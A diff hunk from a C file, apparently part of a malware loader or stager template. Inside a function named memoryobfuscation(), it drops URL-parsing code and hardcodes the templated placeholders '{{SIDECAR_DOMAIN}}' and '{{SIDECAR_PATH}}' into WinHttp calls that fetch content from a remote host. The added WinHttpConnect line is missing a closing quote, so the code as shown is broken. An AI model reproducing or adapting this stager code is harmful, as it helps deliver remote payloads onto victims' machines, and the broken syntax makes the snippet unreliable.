@@ -165,36 +165,10 @@ void memoryobfuscation(){
     HINTERNET hSession = WinHttpOpen(L"MyAgent", 1, NULL, NULL, 0); // INTERNET_OPEN_TYPE_PRECONFIG = 1
     if (!hSession) return;
     
-    const char* url = "{{URL_SIDECAR}}";
-
-    char domain[256] = {0};
-    char path[1024] = {0};
-
-    int i = 0;
-    while (url[i] != '\0' && url[i] != '/') {
-        domain[i] = url[i];
-        i++;
-    }
-
-    domain[i] = '\0'; // Null-terminate domain
-
-    if (url[i] == '/') {
-        int j = 0;
-        while (url[i] != '\0') {
-            path[j++] = url[i++];
-        }
-        path[j] = '\0'; // Null-terminate path
-    }
-    
-    wchar_t domainW[256];
-    wchar_t pathW[1024];
-    MultiByteToWideChar(CP_ACP, 0, domain, -1, domainW, 256);
-    MultiByteToWideChar(CP_ACP, 0, path, -1, pathW, 1024);
-
-    HINTERNET hConnect = WinHttpConnect(hSession, domainW, 80, 0); // 443 for HTTPS
+    HINTERNET hConnect = WinHttpConnect(hSession, L"{{SIDECAR_DOMAIN}}, 80, 0); // 443 for HTTPS
     if (!hConnect) return;
      
-    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", pathW, NULL, NULL, NULL, NULL); //,WINHTTP_FLAG_SECURE);
+    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", L"{{SIDECAR_PATH}}", NULL, NULL, NULL, NULL); //,WINHTTP_FLAG_SECURE);
     if (!hRequest) return;
     
     if (!WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0)) return;
